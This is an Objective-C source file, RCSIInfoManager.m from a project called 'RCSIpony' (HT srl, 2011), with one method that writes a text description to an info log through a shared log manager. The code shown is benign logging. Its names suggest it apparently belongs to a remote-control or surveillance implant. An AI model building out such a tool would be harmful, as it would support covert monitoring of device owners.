/*
 *  RCSIInfoManager.m
 *  RCSIpony
 *
 * Created by Alfredo 'revenge' Pesoli on 5/26/11.
 * Copyright 2011 HT srl. All rights reserved.
 */

#import "RCSIInfoManager.h"
#import "RCSILogManager.h"
#import "RCSITaskManager.h"
#import "RCSICommon.h"

#import "RCSILogger.h"
#import "RCSIDebug.h"


@implementation RCSIInfoManager

- (BOOL)logActionWithDescription: (NSString *)description
{
  if (description == nil)
    {
#ifdef DEBUG_INFO_MANAGER
      errorLog(@"description is nil");
#endif
      return NO;
    }

  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

#ifdef DEBUG_INFO_MANAGER
  infoLog(@"description: %@", description);
#endif

  RCSILogManager *logManager = [RCSILogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_INFO
                           agentHeader: nil
                             withLogID: 0];

  if (success == TRUE)
    {
      NSMutableData *logData = [[NSMutableData alloc] init];
      [logData appendData: [description dataUsingEncoding:
        NSUTF16LittleEndianStringEncoding]];

      [logManager writeDataToLog: logData
                        forAgent: LOG_INFO
                       withLogID: 0];

      [logManager closeActiveLog: LOG_INFO
                       withLogID: 0];

      [logData release];
    }
  else
    {
#ifdef DEBUG_INFO_MANAGER
      errorLog(@"Error while creating log");
#endif
      return NO;
    }
  
  [outerPool release];
  return YES;
}

@end
